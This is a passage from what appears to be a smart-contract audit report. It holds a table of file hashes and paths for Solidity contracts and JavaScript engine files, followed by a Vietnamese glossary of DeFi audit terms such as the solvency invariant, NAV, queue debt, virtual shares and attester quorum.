| `5d376acb67504001d0be822a0276941f6cd94b8a97fa5d9f04ae38d3050e35a4` | 3152 | `audit/vulnerable/engine/quoter.js` |
| `b9b4cc3f793b1927e8d6951a87197277ea66ab93d420c97a95fed3eff4bb1ae5` | 5330 | `audit/vulnerable/scripts/deploy.js` |
| `5942b6e0d0160e02e3f9ad6e4b48d87ee023cb504c3c90ea044b63246d3785f3` | 9516 | `contracts/DiamondDistributor.sol` |
| `e30ef7d9d8c2e417ff0c60497b7441ba2af7a412a51e48d0ad98a664ce02d34e` | 26607 | `contracts/DiamondHouse.sol` |
| `82f782eba73934a2d649894e5ce1e045ce070026a71e792500c194017e0d405c` | 19132 | `contracts/DiamondOptions.sol` |
| `3f97c3ee22dfb1e4be5f8849fcbe89eac5451484579414615c69bed50018b85d` | 3776 | `contracts/DiamondToken.sol` |
| `105c8a33f7cdcbd100bea1f590a40fe37d9097bdeb1f7ba778e5e7592cecf148` | 1736 | `contracts/MockUSDC.sol` |
| `77e3f9cbdc5cbd3e1983179a67f4637efe866e6ef9c12599709b7985c1b553ed` | 8910 | `contracts/RevenueSplit.sol` |
| `b301faf1799defedd6f1f085c543b8928419be3480aa8719e542812635021234` | 7833 | `contracts/Verifiers.sol` |
| `a8636c759e51f47f12aa011784e08362ca362537a592884c3f1be7f68862c5e2` | 7862 | `engine/ledger.js` |
| `29c79c1655c1da91174b9f456cf979280bf89d0f3487ae77b4194c3e955ad89a` | 3744 | `engine/quoter.js` |
| `b61a44e09c08a1fbc81c73545b42fa7f02c81ca4fcab9eff6ef2edb7abe9279c` | 7524 | `scripts/deploy.js` |
| `6fe611faf56cf94104fd853b5cac043d511ab41de489c152d3ba78008a54275c` | 51985 | `audit/report/fixes.diff` |


### D. Thuật ngữ

- **Lane / bất biến solvency:** tổng số dư contract phải không nhỏ hơn tổng nghĩa vụ nội bộ (pool, stake đang mở, credit).
- **NAV (giá trị tài sản ròng):** phần pool thuộc về LP sau khi trừ nợ ưu tiên (queue).
- **queueDebt:** tổng tiền thắng cược đang chờ trong hàng đợi (nợ ưu tiên).
- **Virtual shares/assets:** số share và tài sản ảo, thêm vào công thức để chống inflation kiểu ERC-4626.
- **JIT stake:** stake ngay trước một sự kiện phí, rồi rút sau đó.
- **Carry:** phần phí nhận khi chưa có staker, giữ lại đến khi có staker đầu tiên.
- **Quorum (N-of-M):** số chữ ký tối thiểu từ attester để xác nhận một kết quả.
- **EV:** giá trị kỳ vọng của người mua trên mỗi đơn vị stake.
- **τ (tau):** thời hạn định giá (60 giây) mà quote được tính theo.
